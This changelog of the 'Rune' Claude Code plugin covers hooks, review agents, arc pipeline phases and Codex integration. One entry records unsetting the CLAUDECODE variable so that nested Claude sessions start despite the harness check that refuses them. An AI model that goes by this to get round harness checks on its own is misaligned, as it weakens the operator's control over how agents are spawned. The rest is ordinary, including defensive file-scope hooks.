- Built-in Ashes: 6 → 7 (Veil Piercer is always-on like Ward Sentinel and Pattern Weaver)
- Default `max_ashes`: 8 → 9 (7 built-in + up to 2 custom)
- Warning threshold in custom-ashes.md constraints: 6+ → 7+
- Dedup hierarchy updated across all 30+ occurrences to include `VEIL` prefix

## [1.48.0] — 2026-02-20

### Added
- **Centralized Team Lifecycle Guard Hooks** (TLC-001/002/003)
  - `enforce-team-lifecycle.sh` — PreToolUse:TeamCreate hook for team name validation and stale team cleanup
  - `verify-team-cleanup.sh` — PostToolUse:TeamDelete hook for zombie dir detection
  - `session-team-hygiene.sh` — SessionStart:startup hook for orphaned team detection
  - Hook registration in hooks.json for PreToolUse:TeamCreate, PostToolUse:TeamDelete, and SessionStart:startup

### Changed
- **Plugin version**: 1.47.1 → 1.48.0
- CLAUDE.md: added 3 new hook rows to Hook Infrastructure table
- team-lifecycle-guard.md: added "Centralized Hook Guards" reference section

## [1.47.1] — 2026-02-20

### Fixed
- Echo Search MCP server: use launcher script (`start.sh`) for runtime `CLAUDE_PROJECT_DIR` resolution, since `.mcp.json` env substitution only supports `${CLAUDE_PLUGIN_ROOT}`

## [1.47.0] — 2026-02-19

### Added
- **Goldmask Pipeline Integration** (Phase C-F): Connects 3-layer analysis into core workflows
  - Phase 0.5 Lore Layer in review/audit: Risk-weighted file sorting
  - Phase 2.3 Predictive Goldmask in plan: Wisdom advisories
  - Phase 4.4 Quick Goldmask Check in work: CRITICAL file comparison
  - Phase 5.7 Goldmask Verification in arc: Post-work risk validation
  - Phase 6.5 Goldmask Correlation in arc: TOME finding correlation
- Arc pipeline: 15 → 17 phases (goldmask_verification, goldmask_correlation)
- Checkpoint schema v8 → v9 migration (adds goldmask + test phases)
- ARC_TEAM_PREFIXES: added "goldmask-" for cleanup
- **horizon-sage** strategic depth assessment agent — evaluates plans across 5 dimensions: Temporal Horizon, Root Cause Depth, Innovation Quotient, Stability & Resilience, Maintainability Trajectory
- Intent-aware verdict derivation — adapts thresholds based on `strategic_intent` (long-term vs quick-win)
- Forge Gaze integration — horizon-sage matched to sections with strategy/sustainability keywords
- 2 new elicitation methods: Horizon Scanning (#50), Root Cause Depth Analysis (#51)
- Phase 4C plan review integration — horizon-sage spawned alongside decree-arbiter and knowledge-keeper
- Talisman `horizon` configuration section with kill switch
- **Echo Search MCP expansion**: Added `mcpServers: echo-search` to **all 42 agents** (100% coverage) with tailored Echo Integration sections. Enables direct FTS5 query access to past learnings across all workflow phases:
  - **Research** (5/5): echo-reader, repo-surveyor (past project conventions), git-miner (past historical context), lore-scholar (cached framework knowledge), practice-seeker (past research findings)
  - **Review** (18/18): pattern-seer (past convention knowledge), ward-sentinel (past security vulnerabilities), blight-seer (past design anti-patterns), depth-seer (past missing logic), ember-oracle (past performance bottlenecks), flaw-hunter (past logic bugs), forge-keeper (past migration safety), mimic-detector (past duplication), phantom-checker (past dynamic references), refactor-guardian (past refactoring breakage), reference-validator (past reference integrity), rune-architect (past architectural violations), simplicity-warden (past over-engineering), tide-watcher (past async/concurrency issues), trial-oracle (past test quality), type-warden (past type safety), void-analyzer (past incomplete implementations), wraith-finder (past dead code)
  - **Utility** (9/9): decree-arbiter (past project knowledge), knowledge-keeper (past documentation gaps), horizon-sage (past strategic patterns), elicitation-sage (past reasoning patterns), flow-seer (past flow analysis), mend-fixer (past fix patterns), runebinder (past aggregation patterns), scroll-reviewer (past document quality), truthseer-validator (past validation patterns)
  - **Work** (2/2): rune-smith (past coding conventions), trial-forger (past test patterns)
  - **Investigation** (8/8): goldmask-coordinator (historical risk context), lore-analyst (cached risk baselines), wisdom-sage (past intent classifications), api-contract-tracer (past API contract patterns), business-logic-tracer (past business rule changes), config-dependency-tracer (past config drift patterns), data-layer-tracer (past data model patterns), event-message-tracer (past event schema patterns)

### Changed
- PHASE_ORDER: 15 → 17 entries
- calculateDynamicTimeout: +16 min base budget (goldmask_verification: 15 min, goldmask_correlation: 1 min)
- Agent count: 42 → 46 (utility: 8 → 9, review: 16 → 18, investigation: 8)

## [1.46.0] — 2026-02-19

### Added
- **Inner Flame self-review skill**: Universal 3-layer self-review protocol (Grounding, Completeness, Self-Adversarial) for all Rune teammate agents
  - Core skill at `skills/inner-flame/SKILL.md` with protocol definition and integration guide
  - 6 role-specific checklists in `skills/inner-flame/references/role-checklists.md` (Reviewer, Worker, Fixer, Researcher, Forger, Aggregator)
  - `validate-inner-flame.sh` TaskCompleted hook — blocks task completion when Self-Review Log is missing from teammate output
  - Inner Flame sections added to all 7 ash-prompt templates (forge-warden, ward-sentinel, pattern-weaver, glyph-scribe, knowledge-keeper, codex-oracle, runebinder)
  - Inner Flame checklist added to review-checklist.md shared reference
  - Spawn prompt updates in plan.md (forger), research-phase.md (7 researchers), worker-prompts.md (rune-smith, trial-forger), mend.md (fixer)
  - Agent definition updates: rune-smith (Rule #7 + Seal), trial-forger (Self-Review + Seal), mend-fixer (Step 4.5 + Seal)
  - Talisman config: `inner_flame.enabled`, `inner_flame.confidence_floor`, `inner_flame.block_on_fail`

### Changed
- **Plugin version**: 1.45.0 → 1.46.0
- Skills count: 14 → 15 (plugin.json, marketplace.json descriptions)
- marketplace.json skills array: added `./skills/inner-flame`

## [1.45.0] — 2026-02-19

Consolidated release from arc-batch run (PRs #58–#62).

### Added
- **Per-worker todo files** for `/rune:strive`: Persistent markdown with YAML frontmatter, `_summary.md` generation, PR body integration, sanitization + path containment (PR #58)
- **Configurable codex timeout handling**: Two-layer timeout architecture with validation, error classification, and 12 codex exec site updates. New talisman keys for timeout config (PR #59)
- **refactor-guardian review agent**: Detects refactoring safety issues — verifies rename propagation, extract method completeness, and interface contract preservation (PR #60)
- **reference-validator review agent**: Validates cross-file references, link integrity, and documentation consistency across the codebase (PR #60)
- **Echo Search MCP server**: Python MCP server with SQLite FTS5 for full-text echo retrieval. Includes `indexer.py`, `server.py`, `annotate-hook.sh`, and `.mcp.json` config (PR #61)
- **Echo Search test suite**: 200 tests (78 unit for server, 39 for indexer, 19 for annotate hook, 64 integration with on-disk SQLite). Testdata fixtures with 4 realistic MEMORY.md files across reviewer, orchestrator, planner, and workers roles
- **Dirty signal consumption**: `server.py` now checks for `tmp/.rune-signals/.echo-dirty` (written by `annotate-hook.sh`) before each `echo_search` and `echo_details` call, triggering automatic reindex when new echoes are written. Completes the write→signal→reindex→search data flow
- **QW-1 Code Skimming prompts**: Added token-efficient file reading strategy to `repo-surveyor.md` (matching existing `echo-reader.md` section). Skim first 100 lines, then decide on full read
- **CLAUDE.md documentation**: Added MCP Servers section (echo-search), PostToolUse hook entry for annotate-hook.sh, and `.search-index.db` gitignore note
- **Platform environment configuration guide**: Env var reference table, 7-layer timeout model, pre-flight checklist, cost awareness, SDK heartbeat docs (PR #62)
- **Zombie tmux cleanup**: Step 6 in `rest.md` targeting orphaned `claude-*` tmux sessions (PR #62)

### Changed
- **Agent runtime caps**: `maxTurns: 75` for rune-smith, `maxTurns: 50` for trial-forger (PR #62)
- **MCP schema cost documentation**: Token estimates, multiplication effect per teammate, mitigation guidelines (PR #62)
- **Teammate non-persistence warning**: New section in session-handoff.md + Core Rule 10 in CLAUDE.md (PR #62)
- **Review agent count**: 16 → 18 (propagated to plugin.json, marketplace.json, README, CLAUDE.md, agent-registry)
- **Plugin version**: 1.42.2 → 1.45.0

## [1.43.0] — 2026-02-19

### Added
- **Arc Phase 7.7: TEST** — Diff-scoped test execution with 3-tier testing pyramid (unit → integration → E2E browser)
  - Serial tier execution: faster tiers run first, failures are non-blocking WARNs
  - Diff-scoped test discovery: maps changed files to corresponding tests
  - Service startup auto-detection (docker-compose, package.json, Makefile)
  - E2E browser testing via `agent-browser` with file-to-route mapping (Next.js, Rails, Django, SPA)
  - Model routing: Sonnet for all test execution, Opus only for orchestration + failure analysis
  - `--no-test` flag to skip Phase 7.7 entirely
  - Test report integration into Phase 8 AUDIT inputs
- **`testing` skill**: Test orchestration pipeline knowledge (non-invocable)
- **`agent-browser` skill**: Browser automation knowledge injection for E2E testing (non-invocable)
- **4 testing agents**: `unit-test-runner`, `integration-test-runner`, `e2e-browser-tester`, `test-failure-analyst`
- **5 reference files**: `arc-phase-test.md`, `test-discovery.md`, `service-startup.md`, `file-route-mapping.md`, `test-report-template.md`
- Checkpoint schema v9 (v8→v9 migration: adds `test` phase with `tiers_run`, `pass_rate`, `coverage_pct`, `has_frontend`)
- Talisman `testing:` section with tier-level config (enabled, timeout, coverage, base_url, max_routes)
- Talisman `arc.timeouts.test`: 900,000ms default (15 min), 2,400,000ms with E2E

### Changed
- **Plugin version**: 1.42.2 → 1.43.0
- Skills count: 14 → 16 (added `testing`, `agent-browser`)
- Agent categories: added testing (4 agents)
- Arc PHASE_ORDER: added `test` between `verify_mend` and `audit`
- Arc pipeline: 14 → 15 phases (Phase 7.7 TEST)
- Phase Transition Contracts: VERIFY MEND → TEST → AUDIT (was VERIFY MEND → AUDIT)
- `calculateDynamicTimeout()`: includes test phase budget
- Arc phase-audit inputs: now includes test report

## [1.42.1] — 2026-02-19

### Fixed
- **arc-batch nested session guard**: `arc-batch.sh` now unsets `CLAUDECODE` environment variable before spawning child `claude -p` processes. Fixes "cannot be launched inside another Claude Code session" error when `/rune:arc-batch` is invoked from within an active Claude Code session.

### Changed
- **Plugin version**: 1.42.0 → 1.42.1

## [1.42.0] — 2026-02-19

### Added
- **`/rune:arc-batch` skill**: Sequential batch arc execution across multiple plan files
  - Glob or queue file input: `/rune:arc-batch plans/*.md` or `/rune:arc-batch queue.txt`
  - Full 14-phase pipeline (forge through merge) per plan
  - Crash recovery with `--resume` from `batch-progress.json`
  - Signal handling (SIGINT/SIGTERM/SIGHUP) with clean child process termination
  - Git health checks before each run (stuck rebase, stale lock, MERGE_HEAD, dirty tree)
  - Inter-run cleanup: checkout main, pull latest, delete feature branch, clean state
  - Retry up to 3 attempts per plan with `--resume` on retry
  - macOS compatibility: `setsid` fallback when not available on darwin
  - `--dry-run` flag to preview queue without executing
  - `--no-merge` flag to skip auto-merge (PRs remain open)
  - `batch-progress.json` with schema_version for future compatibility
  - `tmp/.rune-batch-*.json` state file emission for workflow discovery
  - Pre-flight validation via `arc-batch-preflight.sh` (exists, symlink, traversal, duplicate, empty)
- New scripts: `arc-batch.sh`, `arc-batch-preflight.sh`
- Batch algorithm reference: `skills/arc-batch/references/batch-algorithm.md`

### Changed
- **Plugin version**: 1.41.0 → 1.42.0
- Skills count: 13 → 14 (plugin.json, marketplace.json descriptions)
- marketplace.json skills array: added `./skills/arc-batch`
- CLAUDE.md: added arc-batch to Skills and Commands tables
- README.md: added Batch Mode section and Quick Start examples

## [1.41.0] — 2026-02-19

### Fixed
- **BACK-017** (P1): `evaluateConvergence()` premature convergence — P1=0 check at position 1 short-circuited the entire tier system, making `maxCycles` dead code. Reordered decision cascade: minCycles gate → P1+P2 threshold → smart scoring → circuit breaker.
- **BACK-018** (P2): Circuit breaker (maxCycles check) moved from position 3 to position 4 — allows convergence at the final eligible cycle instead of halting.
- **BACK-019** (P2): P2 findings now considered in convergence decisions — both `evaluateConvergence()` and `computeConvergenceScore()` check P2 count against configurable threshold.

### Added
- `minCycles` per tier: LIGHT=1, STANDARD=2, THOROUGH=2 — minimum re-review cycles before convergence is allowed
- `p2Threshold` parameter in convergence evaluation — blocks convergence when P2 findings exceed threshold
- `countP2Findings()` helper in verify-mend.md — counts P2 TOME markers (case-insensitive)
- `p2_remaining` field in convergence history records for observability
- New talisman keys: `arc_convergence_min_cycles`, `arc_convergence_p2_threshold` under `review:` section
- Checkpoint schema v8 with `minCycles` in tier and `p2_remaining` in history
- Configuration guide `review.arc_convergence_*` table with all convergence keys documented

### Changed
- `evaluateConvergence()` signature: 5 params → 6 params (added `p2Count` as 3rd parameter)
- `computeConvergenceScore()` now reads `p2Count` from `scopeStats` and applies P2 hard gate
- `scopeStats` object now includes `p2Count` field
- Tier table updated with Min Cycles column
- **Plugin version**: 1.40.1 → 1.41.0

## [1.40.1] — 2026-02-19

### Fixed
- **QUAL-001** (P1): `resolveArcConfig()` now resolves `pre_merge_checks` from talisman — user overrides were silently ignored
- **SEC-001** (P2): Quoted `prNumber` in `gh pr merge` commands (defensive quoting convention)
- **SEC-002** (P2): Wrapped branch name in backticks in ship phase push failure warning
- **QUAL-002** (P2): Added `mend` to README codex `workflows` example array
- **QUAL-003** (P2): `co_authors` resolution now checks `arc.ship.co_authors` first, falls back to `work.co_authors`
- **QUAL-004** (P2): Added `co_authors` row to configuration-guide.md `arc.ship` table with fallback note
- **DOC-001** (P2): Post-arc plan stamp now says "after Phase 9.5" (was "after Phase 8")
- **DOC-002** (P2): Completion report step 3 is now conditional on `pr_url`
- **DOC-003** (P3): ARC-9 Final Sweep comment updated to reference Phase 9.5
- **DOC-005** (P3): `auto_merge` description clarified — "see `wait_ci` for CI gate" (was "after CI")

### Added
- New `using-rune` skill: workflow discovery and intent routing — suggests correct `/rune:*` command
- `SessionStart` hook: loads workflow routing into context at session start
- 11 skill description rewrites with trigger keywords for better Claude auto-detection

### Changed
- **Plugin version**: 1.40.0 → 1.40.1
- Skills count: 12 → 13

## [1.40.0] — 2026-02-19

### Added
- Arc Phase 9 (SHIP): Auto PR creation after audit via `gh pr create` with generated template
- Arc Phase 9.5 (MERGE): Rebase onto main + auto squash-merge with pre-merge checklist
- 3-layer talisman config resolution for arc: hardcoded defaults → talisman.yml → CLI flags
- `arc.defaults`, `arc.ship`, `arc.pre_merge_checks` talisman sections
- Activated `arc.timeouts` talisman section (was reserved since v1.12.0)
- New CLI flags: `--no-pr`, `--no-merge`, `--draft`
- Checkpoint schema v7 with ship/merge phase tracking and pr_url
- Pre-merge checklist: migration conflicts, schema drift, lock files, uncommitted changes
- Configuration guide `## arc` section with full schema documentation (DOC-KK-010)

### Changed
- Arc pipeline expanded from 12 to 14 phases
- `calculateDynamicTimeout()` includes ship (300000ms) + merge (600000ms) phase budgets
- **Plugin version**: 1.39.2 → 1.40.0

## [1.39.2] — 2026-02-19

### Fixed
- **DOC-001**: Pre-commit checklist now says "all four files" with flat numbering (was "three" with ambiguous "Also sync" separator)
- **DOC-002**: Pre-commit checklist marketplace.json path now qualified with "repo-root" to avoid ambiguity
- **SEC-001**: Validation command `$f` variable now properly quoted: `$(basename "$(dirname "$f")")`
- **QUAL-001**: Converted remaining backtick path in `arc-phase-code-review.md` to markdown link
- **QUAL-006**: Added zsh glob compliance note to Skill Compliance section (covers both `skills/` and `commands/`)

### Changed
- **Plugin version**: 1.39.1 → 1.39.2
- Pre-commit file paths now use full relative paths from repo root for clarity

## [1.39.1] — 2026-02-18

### Fixed
- **AUDIT-ARCH-002**: rune-smith Step 6.5 now checks `codexWorkflows.includes("work")` gate — consistent with all other Codex integration points
- **AUDIT-SEC-001**: rune-smith Step 6.5 now verifies `.codexignore` exists before `--full-auto` invocation
- **AUDIT-SEC-004**: Elicitation cross-model protocol (SKILL.md) now includes `.codexignore` pre-flight at step 2.5

### Added
- CHANGELOG entries for v1.38.0 and v1.39.0 (previously missing)

### Changed
- **Plugin version**: 1.39.0 → 1.39.1

## [1.39.0] — 2026-02-18

### Added
- **Codex Deep Integration** — 9 new cross-model integration points extending Codex Oracle from 5 to 14 workflow touchpoints. Each uses GPT-5.3-codex as a second-perspective verification layer. All follow the Canonical Codex Integration Pattern (detect → validate → spawn → execute → verify → output → cleanup).
  - **IP-1: Elicitation Sage cross-model reasoning** — `codex_role` column added to methods.csv. Adversarial methods (Red Team vs Blue Team, Pre-mortem, Challenge) now use Codex for the opposing perspective. Orchestrator spawns Codex teammate; sage reads output file.
  - **IP-2: Mend Fix Verification** — Phase 5.8 in mend.md. After fixers apply TOME fixes, Codex batch-verifies all diffs for regressions, weak fixes, and conflicts. Verdicts: GOOD_FIX, WEAK_FIX, REGRESSION, CONFLICT.
  - **IP-3: Arena Judge** — Cross-model solution evaluation in Plan Phase 1.8B. Codex scores solutions on 5 dimensions + optional solution generation mode. Cross-model agreement bonus in scoring matrix.
  - **IP-4: Semantic Verification (Phase 2.8)** — New arc phase after Phase 2.7. Codex checks enriched plan for internal contradictions (technology, scope, timeline, dependency). Separate phase with own 120s budget (doesn't conflict with Phase 2.7's 30s deterministic gate).
  - **IP-5: Codex Gap Analysis** — Arc Phase 5.6, after Claude gap analysis. Compares plan expectations vs actual implementation. Findings: MISSING, EXTRA, INCOMPLETE, DRIFT.
  - **IP-6: Trial Forger edge cases** — Step 4.5 in trial-forger.md. Before writing tests, Codex suggests 5-10 edge cases (boundary values, null inputs, concurrency, error paths).
  - **IP-7: Rune Smith inline advisory** — Step 6.5 in rune-smith.md. Optional quick Codex check on worker diffs. **Disabled by default** (opt-in via `codex.rune_smith.enabled: true`).
  - **IP-8: Shatter complexity scoring** — Cross-model blended score in Plan Phase 2.5. 70% Claude + 30% Codex weighted average for shatter gate decisions.
  - **IP-9: Echo validation** — Before persisting learnings to `.claude/echoes/`, Codex checks if insight is generalizable or context-specific. Tags context-specific entries for lower retrieval priority.
- 9 new talisman keys under `codex:` — `elicitation`, `mend_verification`, `arena`, `semantic_verification`, `gap_analysis`, `trial_forger`, `rune_smith`, `shatter`, `echo_validation`
- `"mend"` added to default `codex.workflows` fallback array across all command files
- `.codexignore` pre-flight checks added to mend.md, trial-forger.md, arc SKILL.md (SEC-002 fixes)
- Arc phases updated: Phase 2.8 (semantic verification), Phase 5.6 (Codex gap analysis)
- codex-cli SKILL.md output conventions table updated with all 9 new output paths

### Changed
- **Plugin version**: 1.38.0 → 1.39.0
- **elicitation-sage.md**: Added Cross-Model Workflow section with sage-side synthesis protocol
- **elicitation SKILL.md**: Added Cross-Model Routing section, codex_role CSV column documentation, orchestrator-level protocol
- **methods.csv**: Added `codex_role` column (11th column). 3 methods tagged: Red Team vs Blue Team (`red_team`), Pre-mortem Analysis (`failure`), Challenge from Critical Perspective (`critic`)
- **solution-arena.md**: Added Codex Arena Judge sub-step 1.8B extension + scoring integration in 1.8C
- **gap-analysis.md**: Extended with Codex Gap Analysis (Phase 5.6) section
- **arc SKILL.md**: Added Phase 2.8 (semantic verification) + Codex gap analysis phase + checkpoint schema update
- **CLAUDE.md**: Updated skill descriptions, phase list, and codex-cli skill description

### Known Issues
- **AUDIT-ARCH-002** (P2): rune-smith Step 6.5 missing `codexWorkflows` gate — fixed in post-arc patch
- **AUDIT-SEC-001/004** (P2): `.codexignore` pre-flight missing in rune-smith + elicitation protocol — fixed in post-arc patch

## [1.38.0] — 2026-02-18

### Added
- **Diff-Scope Engine** — Generates per-file line ranges from `git diff` for review scope awareness. Enriches `inscription.json` with `diff_scope` data, enabling TOME finding tagging (`in-diff` vs `pre-existing`) and scope-aware mend priority filtering.
  - New shared reference: `rune-orchestration/references/diff-scope.md` (Diff Scope Engine + TOME Tagger)
  - New shared reference: `roundtable-circle/references/diff-scope-awareness.md` (Ash-facing guidance)
  - `inscription.json` schema extended with `diff_scope` object (enabled, base_ref, ranges, expansion_zone)
  - TOME Phase 5.3 tagger: classifies findings as `in-diff` or `pre-existing` based on line ranges
  - Mend priority filtering: `in-diff` findings prioritized over `pre-existing`
- **Smart Convergence Scoring** — `computeConvergenceScore()` with 4-component weighted formula replacing simple finding-count comparison. Components: finding reduction (40%), severity improvement (25%), scope coverage (20%), fix success rate (15%). Partially mitigates SCOPE-BIAS (P3 from v1.37.0).
- 3 new talisman keys: `review.diff_scope.expansion` (default: 8), `review.diff_scope.max_files` (default: 200), `review.convergence.smart_scoring` (default: true)
- Diff Scope Awareness section added to all 6 Ash prompt files (codex-oracle, forge-warden, glyph-scribe, knowledge-keeper, pattern-weaver, ward-sentinel)

### Changed
- **Plugin version**: 1.37.0 → 1.38.0
- **review.md**: Added diff-scope generation in Phase 0, `--no-diff-scope` flag
- **parse-tome.md**: Added scope-based priority sorting for mend file groups
- **review-mend-convergence.md**: Replaced simple threshold with `computeConvergenceScore()` + configurable `convergence_threshold` (default: 0.7)
- **arc SKILL.md**: Phase 5.5 gap analysis now receives diff scope data
- **verify-mend.md**: Convergence evaluation uses smart scoring when enabled
- **inscription-schema.md**: Documented `diff_scope` object schema
- **arc-phase-completion-stamp.md**: Completion report includes diff scope summary

## [1.37.0] — 2026-02-18

### Added
- **Goldmask v2 — Wisdom Layer**: Three-layer cross-layer impact analysis (Impact + Wisdom + Lore) with Collateral Damage Detection
  - Impact Layer: 5 Haiku tracers for dependency tracing across data, API, business, event, and config layers
  - Wisdom Layer: Sonnet-powered git archaeology — understands WHY code was written via git blame, commit intent classification, and caution scoring
  - Lore Layer: Quantitative git history analysis — per-file risk scores, churn metrics, co-change clustering, ownership concentration
  - Collateral Damage Detection: Noisy-OR blast-radius scoring + Swarm Detection for bugs that travel in pairs
  - Goldmask Coordinator: Three-layer synthesis into unified GOLDMASK.md report with findings.json
- New `/rune:goldmask` standalone skill for on-demand investigation
- 8 new investigation agents in `agents/investigation/`: 5 impact tracers + wisdom-sage + lore-analyst + goldmask-coordinator
- New `goldmask` talisman configuration section with layer-specific settings, CDD thresholds, and mode selection
- **Adaptive review-mend convergence loop** — Phase 7.5 (verify_mend) now runs a full review-mend convergence controller instead of single-pass spot-check. Repeats Phase 6→7→7.5 until findings converge or max cycles reached.
- **3-tier convergence system** — LIGHT (2 cycles, ≤100 lines AND no high-risk files AND type=fix), STANDARD (3 cycles, default), THOROUGH (5 cycles, >2000 lines OR high-risk files OR large features). Tier auto-detected from changeset size, risk signals, and plan type.
- **Progressive review focus** — Re-review rounds narrow scope to mend-modified files + 1-hop dependencies (max 10 additional). Reduces review cost on retry cycles.
- **Dynamic arc timeout** — `calculateDynamicTimeout(tier)` replaces fixed `ARC_TOTAL_TIMEOUT`. Scales 162-240 min based on tier, hard cap at 240 min.
- **Shared convergence reference** — `roundtable-circle/references/review-mend-convergence.md` contains `selectReviewMendTier()`, `evaluateConvergence()`, `buildProgressiveFocus()` shared by arc and standalone review.
- **`--cycles <N>` flag for `/rune:appraise`** — Run N standalone review passes (1-5, numeric only) with TOME dedup merge. Standalone equivalent of arc convergence loop.
- **`--scope-file <path>` flag for `/rune:appraise`** — Override changed_files from a JSON focus file. Used by arc convergence controller for progressive re-review scope.
- **`--no-converge` flag for `/rune:appraise`** — Disable convergence loop for single review pass per chunk (report still generated).
- **`--auto-mend` flag for `/rune:appraise`** — Auto-invoke `/rune:mend` after review completes when P1/P2 findings exist (skips post-review AskUserQuestion). Also configurable via `review.auto_mend: true` in talisman.yml.
- **Arc convergence talisman keys** — `arc_convergence_tier_override`, `arc_convergence_max_cycles`, `arc_convergence_finding_threshold`, `arc_convergence_improvement_ratio` (all under `review:` with `arc_` prefix to avoid collision with standalone review convergence keys).
- **Checkpoint schema v6** — Adds `convergence.tier` object (name, maxCycles, reason). Auto-migrated from v5 with `TIERS.standard` default.

### Changed
- Agent count: 31 → 39 (added 8 investigation agents)
- Skills: 11 → 12 (added goldmask)
- **verify-mend.md**: Replaced single-pass spot-check with full convergence controller using shared `evaluateConvergence()` logic
- **arc-phase-code-review.md**: Added progressive focus section for re-review rounds, round-aware TOME relocation
- **arc-phase-mend.md**: Round-aware resolution report naming (`resolution-report-round-{N}.md`)
- **arc SKILL.md**: Dynamic timeout calculation, updated checkpoint init (convergence tier), schema v5→v6 migration, updated completion report format
- **CLAUDE.md**: Phase 7.5 description updated from "verify mend" to "adaptive convergence loop"
- **Plugin version**: 1.36.0 → 1.37.0

### Known Limitations
- **SCOPE-BIAS** (P3, tracked for v1.38.0): `findings_before` comparison in convergence evaluation is biased by scope reduction (full → focused review). Pass 1 reviews all changed files; pass 2+ reviews only mend-modified files + dependencies. A decrease in findings may reflect narrower scope rather than code improvement. See `review-mend-convergence.md` §Scope Limitation Note.

## [1.35.0] - 2026-02-18

### Fixed
- **CDX-003: Filesystem fallback blast radius** — Gate cross-workflow `find` scan behind `!teamDeleteSucceeded` flag. When TeamDelete succeeds cleanly, skip the filesystem fallback entirely — prevents wiping concurrent `rune-*`/`arc-*` workflows
- **QUAL-003: Cleanup phase retry-with-backoff** — All 6 command cleanup phases now use retry-with-backoff (3 attempts: 0s, 3s, 8s) matching the pre-create guard pattern. Previously cleanup used single-try TeamDelete with immediate rm-rf fallback
- **Pre-create guard count correction** — Fixed count from 9 to 8 (6 commands + arc-phase-plan-review + verify-mend)
- **Retry attempt logging off-by-one** — `attempt + 1` in warn messages (was showing attempt 0 as first retry)

### Changed
- **CLAUDE.md**: Added `chome-pattern` skill to skills table
- **team-lifecycle-guard.md**: Both canonical + roundtable-circle copies updated with CDX-003 `!teamDeleteSucceeded` gate
- **arc-phase-plan-refine.md**: Added `--confirm` flag documentation for all-CONCERN escalation

## [1.34.0] - 2026-02-18

### Added
- **`chome-pattern` skill** — Reference for `CLAUDE_CONFIG_DIR` resolution pattern. Covers SDK vs Bash classification, canonical patterns, and audit commands. Skill count updated to 9.
- **`--confirm` flag for `/rune:arc`** — Pause for user input on all-CONCERN escalation in Phase 2.5. Without this flag, arc auto-proceeds with warnings.

### Changed
- **teamTransition() 5-step inlined protocol**: Retry-with-backoff (0s, 3s, 8s), filesystem fallback, "Already leading" catch-and-recover, post-create verification
- **Pre-create guards hardened**: All 8 pre-create guards (6 commands + arc-phase-plan-review + verify-mend) use inlined teamTransition pattern
- **CHOME fix in cleanup phases**: All 6 command cleanup phases + 3 cancel commands now use `CLAUDE_CONFIG_DIR` pattern instead of bare `~/.claude/`
- **Arc prePhaseCleanup + ORCH-1 hardened**: Retry-with-backoff + CHOME pattern in inter-phase cleanup
- **Cancel commands hardened**: Retry-with-backoff + CHOME in all 3 cancel commands
- **Reference doc sync**: team-lifecycle-guard.md canonical protocol + roundtable-circle copy synced (including CDX-003 `!teamDeleteSucceeded` gate)

## [1.33.0] - 2026-02-18

### Fixed
- **Stale team leadership state** — pre-create guard v2 fixes two bugs causing "Already leading team X" errors:
  - Wrong `rm -rf` target: fallback now cleans the target team AND cross-workflow scan removes ALL stale `rune-*`/`arc-*` team dirs
  - Missing retry: `TeamDelete()` is retried after filesystem cleanup to clear SDK internal leadership state
- Removed `sleep 5` band-aid from `forge.md` pre-create guard — replaced with direct filesystem cleanup + retry

### Changed
- Pre-create guard pattern upgraded to 3-step escalation across 12 files:
  - Step A: `rm -rf` target team dirs (same as before)
  - Step B: Cross-workflow `find` scan for ANY stale `rune-*`/`arc-*` dirs (new)
  - Step C: Retry `TeamDelete()` to clear SDK internal state (new)
- All pre-create guard `Bash()` commands now resolve `CLAUDE_CONFIG_DIR` via `CHOME="${CLAUDE_CONFIG_DIR:-$HOME/.claude}"` — supports multi-account setups (e.g., `~/.claude-work`)
- `prePhaseCleanup()` in arc SKILL.md: added retry `TeamDelete()` after rm-rf loop
- ORCH-1 resume cleanup: added retry `TeamDelete()` after checkpoint + stale scan cleanup
- Updated critical ordering rules in team-lifecycle-guard.md (both copies)

## [1.32.0] - 2026-02-18

### Added
- **Mend file ownership enforcement** — three-layer defense preventing concurrent file edits by mend fixers
  - Layer 1: Path normalization in parse-tome.md (`normalizeFindingPath()`) — prevents `./src/foo.ts` and `src/foo.ts` creating duplicate groups
  - Layer 2: `blockedBy` serialization via cross-group dependency detection (`extractCrossFileRefs()`) — dependent groups execute sequentially
  - Layer 3: PreToolUse hook (`scripts/validate-mend-fixer-paths.sh`) — hard enforcement blocking Write/Edit/NotebookEdit to files outside assigned group
- `file_targets` and `finding_ids` metadata in mend TaskCreate — parity with work.md ownership tracking
- Sequential batching for 6+ file groups (max 5 concurrent fixers per batch)
- `validate-mend-fixer-paths.sh` registered in `hooks/hooks.json` as PreToolUse hook
- Phase 1.5 cross-group dependency detection in mend.md with sanitized regex extraction

### Changed
- `mend-fixer.md` security note updated to reference active hook enforcement (was "Recommended")
- `parse-tome.md` now includes "Path Normalization" section before "Group by File"
- `mend.md` Phase 3 wraps fixer summoning in batch loop with per-batch monitoring
- `mend.md` Phase 4 clarified as single-batch only (multi-batch monitoring is inline in Phase 3)

### Security
- SEC-MEND-001: Mend fixer file scope enforcement via PreToolUse hook (fail-open design, jq-based JSON deny)
- Inscription-based ownership validation prevents fixers from editing files outside their assigned group
- Cross-file dependency sanitization: HTML comment stripping, code fence removal, 1KB input cap

## [1.29.2] - 2026-02-17

### Fixed
- CDX-7: Post-delegation cleanup guard for crashed sub-commands — three-layer orphan defense prevents resource leaks from crashed workflows

### Added
- `/rune:rest --heal` flag for manual orphan recovery — scans for stale state files and orphaned team directories
- Arc resume pre-flight cleanup (ORCH-1) — automatically cleans orphaned teams when resuming arc sessions
- Arc pre-flight stale team scan — removes stale arc-specific teams from prior sessions
- Crash recovery documentation for all 4 arc-phase reference files

### Changed
- `team-lifecycle-guard.md`: Added `safeTeamCleanup()` utility, `isStale()` staleness detection, and orphan recovery pattern documentation

### Upgrade Note
If you have orphaned team directories from prior crashed workflows, run `/rune:rest --heal` to clean them up.

## [1.29.1] - 2026-02-17

Fix: Arc inter-phase team cleanup guard (ARC-6).

### Fixed
- Arc dispatcher now runs `prePhaseCleanup()` before every delegated phase
- Stale team directories cleaned via checkpoint-aware `rm -rf` before TeamCreate
- Resume logic enhanced with team cleanup guard

### Changed
- arc.md: Added `prePhaseCleanup()` function and 5 phase-dispatch guard calls + 1 resume guard call
- team-lifecycle-guard.md: Added ARC-6 section and consumer reference
- 5 arc-phase reference files: Added ARC-6 delegation notes
- plugin.json, marketplace.json: version 1.29.0 → 1.29.1

## [1.29.0] - 2026-02-17

### Added
- Standardized plan header fields: `version_target`, `complexity`, `scope`, `risk`, `estimated_effort`, `impact`
- Field-filling guidance in synthesize.md for plan generation
- Arc completion stamp: updates plan Status field and appends persistent execution record when arc finishes (success, partial, or failure)

### Changed
- Plan templates (Minimal, Standard, Comprehensive) updated with new header fields

## [1.28.3] - 2026-02-17

